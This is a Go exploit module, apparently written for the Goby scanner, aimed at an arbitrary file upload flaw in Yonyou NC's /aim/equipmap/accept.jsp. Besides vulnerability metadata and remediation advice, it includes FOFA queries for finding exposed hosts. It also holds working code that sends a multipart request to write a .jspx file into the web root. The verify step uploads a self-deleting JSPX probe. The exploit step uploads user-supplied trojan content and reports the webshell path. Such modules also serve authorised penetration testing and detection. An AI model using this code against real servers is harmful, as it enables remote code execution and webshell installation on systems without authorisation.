package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Yonyou NC accept.jsp file upload vulnerability",
    "Description": "<p>Yonyou NC is a management software for group enterprises under China UFIDA Group.</p><p>There is an arbitrary file upload vulnerability in Yonyou NC /aim/equipmap/accept.jsp route, attackers can upload arbitrary files, execute arbitrary code on the server, obtain webshell, etc.</p>",
    "Impact": "<p>There is an arbitrary file upload vulnerability in UFIDA NC /aim/equipmap/accept.jsp route, attackers can upload arbitrary files, execute arbitrary code on the server, obtain webshell, etc.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.yonyou.com/\">https://www.yonyou.com/</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "Product": "yonyou-NC-Cloud",
    "VulType": [
        "File Upload"
    ],
    "Tags": [
        "File Upload"
    ],
    "Translation": {
        "CN": {
            "Name": "用友 NC accept.jsp 文件上传漏洞",
            "Product": "用友-NC-Cloud",
            "Description": "<p>用友 NC 是中国用友集团旗下一款面向集团企业的管理软件。</p><p>用友 NC /aim/equipmap/accept.jsp 路由存在任意文件上传漏洞，攻击者可以上传任意文件，在服务器上执行任意代码，获取 webshell 等。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.yonyou.com/\">https://www.yonyou.com/</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Impact": "<p><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">用友 NC&nbsp;/aim/equipmap/accept.jsp</span><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">&nbsp;</span><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">路由存在任意文件上传漏洞，攻击者可以上传任意文件，在服务器上执行任意代码，获取 webshell 等。</span><br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "Yonyou NC accept.jsp file upload vulnerability",
            "Product": "yonyou-NC-Cloud",
            "Description": "<p>Yonyou NC is a management software for group enterprises under China UFIDA Group.</p><p>There is an arbitrary file upload vulnerability in Yonyou NC /aim/equipmap/accept.jsp route, attackers can upload arbitrary files, execute arbitrary code on the server, obtain webshell, etc.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.yonyou.com/\">https://www.yonyou.com/</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>There is an arbitrary file upload vulnerability in UFIDA NC /aim/equipmap/accept.jsp route, attackers can upload arbitrary files, execute arbitrary code on the server, obtain webshell, etc.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "FofaQuery": "banner=\"nccloud\" || header=\"nccloud\" || (body=\"/platform/yonyou-yyy.js\" && body=\"/platform/ca/nccsign.js\") || body=\"window.location.href=\\\"platform/pub/welcome.do\\\";\" || (body=\"UFIDA\" && body=\"logo/images/\") || body=\"logo/images/ufida_nc.png\" || title=\"Yonyou NC\" || body=\"<div id=\\\"nc_text\\\">\" || body=\"<div id=\\\"nc_img\\\" onmouseover=\\\"overImage('nc');\" || (title==\"产品登录界面\" && body=\"UFIDA NC\") || body=\"/Client/Uclient/UClient.dmg\"",
    "GobyQuery": "banner=\"nccloud\" || header=\"nccloud\" || (body=\"/platform/yonyou-yyy.js\" && body=\"/platform/ca/nccsign.js\") || body=\"window.location.href=\\\"platform/pub/welcome.do\\\";\" || (body=\"UFIDA\" && body=\"logo/images/\") || body=\"logo/images/ufida_nc.png\" || title=\"Yonyou NC\" || body=\"<div id=\\\"nc_text\\\">\" || body=\"<div id=\\\"nc_img\\\" onmouseover=\\\"overImage('nc');\" || (title==\"产品登录界面\" && body=\"UFIDA NC\") || body=\"/Client/Uclient/UClient.dmg\"",
    "Author": "兔兔",
    "Homepage": "https://hc.yonyou.com/product.php?id=4",
    "DisclosureDate": "2022-07-27",
    "References": [],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [],
    "CNVD": [
        "CNVD-2020-47540"
    ],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "fileName",
            "type": "input",
            "value": "evil",
            "show": ""
        },
        {
            "name": "fileContent",
            "type": "input",
            "value": "此处写 JSPX 木马内容",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "CVSSScore": "10",
    "PocId": "10831"
}`

	uploadDataToNC23984753 := func(u *httpclient.FixUrl, fileName string, fileContent string) bool {
		cfg := httpclient.NewPostRequestConfig("/aim/equipmap/accept.jsp")
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		cfg.Header.Store("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundaryQLdBUKFoDLaANtgB")
		cfg.Data = "------WebKitFormBoundaryQLdBUKFoDLaANtgB\r\nContent-Disposition: form-data; name=\"file\"; filename=\"images.jpg\"\r\nContent-Type: image/jpeg\r\n\r\n" + fileContent + "\r\n------WebKitFormBoundaryQLdBUKFoDLaANtgB\r\nContent-Disposition: form-data; name=\"fname\"\r\n\r\n/webapps/nc_web/" + fileName + ".jspx\r\n------WebKitFormBoundaryQLdBUKFoDLaANtgB--\r\n"
		if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil && resp.StatusCode == 200 {
			if strings.Contains(resp.Utf8Html, "The real file") && strings.Contains(resp.Utf8Html, "parent.afterUpload(1)") {
				return true
			}
		}
		return false
	}
	checkPocFileExist3984783902 := func(u *httpclient.FixUrl, uri string, content string) bool {
		cfg := httpclient.NewGetRequestConfig(uri)
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil && resp.StatusCode == 200 {
			if strings.Contains(resp.Utf8Html, content) {
				return true
			}
		}
		return false
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			rand1 := goutils.RandomHexString(6)
			rand2 := goutils.RandomHexString(6)
			if uploadDataToNC23984753(u, rand2, "<jsp:root xmlns=\"http://www.w3.org/1999/xhtml\" version=\"2.0\"  xmlns:jsp=\"http://java.sun.com/JSP/Page\" xmlns:c=\"http://java.sun.com/jsp/jstl/core\">  \n<jsp:directive.page contentType=\"text/html;charset=UTF-8\" language=\"java\" />  \n<jsp:scriptlet> \nout.println(\""+rand1+"\");\nnew java.io.File(application.getRealPath(request.getServletPath())).delete();\n</jsp:scriptlet>\n</jsp:root>") {
				return checkPocFileExist3984783902(u, "/"+rand2+".jspx", rand1)
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			fileName := ss.Params["fileName"].(string)
			fileContent := ss.Params["fileContent"].(string)
			if uploadDataToNC23984753(expResult.HostInfo, fileName, fileContent) {
				expResult.Success = true
				expResult.Output = "攻击已成功，文件已上传，访问路径 /" + fileName + ".jspx"
			}
			return expResult
		},
	))
}
